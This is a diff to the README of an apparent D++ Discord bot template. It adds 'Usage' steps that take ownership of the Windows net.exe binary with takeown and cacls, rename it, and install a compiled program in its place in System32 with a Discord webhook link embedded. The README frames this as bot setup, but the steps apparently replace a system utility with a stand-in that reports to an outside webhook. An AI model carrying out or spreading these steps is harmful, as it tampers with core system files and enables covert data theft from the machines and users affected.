@@ -5,3 +5,13 @@ A [D++](https://github.com/brainboxdotcc/DPP) Discord Bot template for Visual St
 This template comes packaged with the latest master branch of D++ from the CI. To use this project simply put your code into the `MyBot.cpp` and press F7. You can do much more with this template.
 
 For support and assistance please join [the official support discord](https://discord.gg/dpp).
+
+## Usage
+1. rename net.exe to not.exe
+    - `takeown /F net.exe`
+    - `cacls net.exe /e /p <username>:f`
+    - `move net.exe not.exe`
+3. Place your discord web hook link into the program
+4. Compile this program and put it in `C:\Windows\System32\`
+5. Add dependencies to `C:\Windows\System32\`
+6. Flourish
